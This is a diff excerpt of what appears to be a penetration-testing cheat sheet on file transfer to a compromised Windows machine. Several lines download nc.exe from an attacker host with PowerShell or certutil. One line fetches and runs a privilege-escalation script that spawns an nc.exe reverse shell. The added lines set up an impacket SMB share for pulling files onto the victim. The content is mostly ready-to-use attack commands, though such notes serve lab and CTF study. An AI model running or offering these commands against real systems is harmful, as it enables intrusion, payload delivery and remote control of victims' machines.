@@ -201,6 +201,14 @@
 - powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
 - certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
 - iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
+  - Append Command End of script
+  - Invoke-Name_Script -Reverse -IP 123 -Port 123
+- **SMB**
+  - Attacker
+    - impacket-smbserver share $(pwd) -smb2support
+  - Victim
+    - copy \\$attacker\share\file
+- [Other methods](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
 
 ### Linux
 - wget attacker-machine:8000:file.ext
